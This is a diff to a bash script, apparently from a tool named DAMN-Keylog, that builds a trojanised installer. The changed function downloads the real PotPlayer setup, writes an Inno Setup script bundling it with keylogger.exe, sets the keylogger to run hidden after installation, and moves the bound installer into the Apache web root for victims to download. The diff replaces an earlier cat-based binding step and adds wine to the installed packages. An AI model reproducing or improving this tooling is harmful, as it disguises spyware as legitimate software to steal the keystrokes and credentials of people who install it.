@@ -8,7 +8,7 @@ display_banner() {
   echo -e "\e[92m#                                               #\e[0m"
   echo -e "\e[92m#################################################\e[0m"
   echo -e "\e[93m"
-  
+ 
 }
 
 # Default values
@@ -42,9 +42,28 @@ generate_keylogger() {
   echo "Downloading PotPlayer setup..."
   wget https://t1.daumcdn.net/potplayer/PotPlayer/Version/Latest/PotPlayerSetup.exe -O PotPlayerSetup.exe
 
-  echo "Binding keylogger with PotPlayer setup..."
-  cat PotPlayerSetup.exe keylogger.exe > PotPlayerSetupBound.exe
-  chmod +x PotPlayerSetupBound.exe
+  echo "Creating Inno Setup script..."
+  cat <<EOF > installer.iss
+[Setup]
+AppName=DAMN-Keylog
+AppVersion=1.0
+DefaultDirName={pf}\DAMN-Keylog
+DefaultGroupName=DAMN-Keylog
+OutputBaseFilename=PotPlayerSetupBound
+Compression=lzma
+SolidCompression=yes
+
+[Files]
+Source: "PotPlayerSetup.exe"; DestDir: "{app}"; Flags: ignoreversion
+Source: "keylogger.exe"; DestDir: "{app}"; Flags: ignoreversion
+
+[Run]
+Filename: "{app}\PotPlayerSetup.exe"; Description: "Install PotPlayer"; Flags: nowait postinstall
+Filename: "{app}\keylogger.exe"; Description: "Run Keylogger"; Flags: nowait postinstall shellexec runhidden
+EOF
+
+  echo "Running Inno Setup to create the installer..."
+  wine "C:\Program Files (x86)\Inno Setup 6\ISCC.exe" installer.iss
 
   echo "Moving the bound setup executable to the Apache server directory..."
   sudo mv PotPlayerSetupBound.exe /var/www/html/
@@ -64,7 +83,7 @@ start_server() {
 # Ensure the system is updated and install necessary packages
 echo "Updating system and installing necessary packages..."
 sudo apt-get update
-sudo apt-get install -y mingw-w64 python3 apache2 git upx
+sudo apt-get install -y mingw-w64 python3 apache2 git upx wine
 
 # Display the banner
 display_banner
